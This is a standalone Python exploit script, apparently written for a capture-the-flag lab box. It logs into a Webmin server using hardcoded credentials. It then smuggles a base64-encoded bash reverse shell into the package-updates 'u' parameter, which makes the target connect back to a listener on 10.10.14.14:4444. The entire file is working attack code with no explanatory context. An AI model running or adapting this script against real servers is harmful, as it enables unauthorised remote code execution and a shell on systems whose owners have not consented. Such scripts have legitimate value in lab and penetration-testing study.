#!/bin/python3

import base64
import os
import requests
import urllib3

# suppress self-signed certificate warnings
urllib3.disable_warnings()

target = 'https://10.10.10.160:10000'

print("[*] login to %s" % target)
login_request = requests.post(
    f"{target}/session_login.cgi",
    cookies={'testing': '1'},
    data={'user': 'Matt', 'pass': 'computer2008'},
    verify=False,
    allow_redirects=False)

sid = login_request.headers['Set-Cookie'].split(';')[0].replace('sid=', '')
#print("[+] sid=[%s]" % sid)

remote_ip = os.environ.get('REMOTE_IP', '10.10.14.14')
remote_port = os.environ.get('REMOTE_PORT', '4444')

# payload
reverse_shell = f"bash -i >& /dev/tcp/{remote_ip}/{remote_port} 0>&1"
reverse_shell_encoded = base64.b64encode(bytes(reverse_shell, 'utf-8')).decode('utf-8')
payload = ' | bash -c "{echo,-n,' + reverse_shell_encoded + ',}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
#print("[+] payload=[%s]" % payload)

print("[*] open reverse shell on %s:%s" % (remote_ip, remote_port))

try:
    update_request = requests.post(
        f"{target}/package-updates/update.cgi",
        headers= {'Connection': 'close','referer': f"{target}/package-updates/?xnavigation=1"},
        cookies={'sid': sid},
        data={'u': ['acl/apt', payload]},
        verify=False,
        allow_redirects=False,
        timeout=10)
except:
    print("[-] exiting...")
